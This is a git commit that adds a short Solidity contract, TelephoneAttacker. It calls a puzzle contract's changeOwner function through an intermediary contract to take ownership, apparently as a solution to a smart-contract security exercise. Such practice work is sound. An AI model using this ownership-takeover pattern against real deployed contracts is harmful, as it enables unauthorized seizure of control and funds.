5eceba5d35a65288ee3a028d6d7d3aebb66f0b5b
vincent71399 <vincent71399@gmail.com>
2024-09-26 16:26:28 +0800

    -4.telephone

---
+++ src/attackers/4/TelephoneAttacker.sol
@@ -0,0 +1,16 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import {Telephone} from "../../puzzles/4/Telephone.sol";
+
+contract TelephoneAttacker {
+    Telephone public immutable telephone;
+
+    constructor(address telephoneAddress){
+        telephone = Telephone(telephoneAddress);
+    }
+
+    function attack(address newOwner) external {
+        telephone.changeOwner(newOwner);
+    }
+}
